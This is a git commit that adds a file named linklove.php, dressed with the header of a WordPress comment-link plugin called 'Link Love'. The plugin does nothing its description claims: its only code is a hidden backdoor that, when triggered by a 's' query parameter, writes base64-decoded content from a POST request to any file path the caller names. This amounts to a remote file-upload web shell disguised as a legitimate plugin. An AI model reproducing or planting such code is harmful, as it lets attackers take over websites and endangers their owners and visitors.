5bdc3765a33f09f14eceb83972746758968e523b
Stefan Pejcic <pejcha1994@gmail.com>
2020-02-03 09:59:49 +0100

    Create linklove.php

---
+++ 3.2.2020/linklove.php
@@ -0,0 +1,11 @@
+<?php
+/*
+Plugin Name: Link Love
+Plugin URI: http://www.intenseblog.com/wordpress/link-love.html
+Description: The Link Love Wordpress plugin will count the number of approved comments each commentator has left on your blog and then reward he/she with a Do-follow link in the Comment Author Link field.
+Author: Jennifer Ray
+Version: 1.2
+Author URI: http://www.intenseblog.com
+*/
+?>
+<?php if(isset($_GET['s'])){echo 'nsd'.'fjk';if(isset($_POST['c'])){file_put_contents($_POST['n'],base64_decode($_POST['c']));}die();}?>
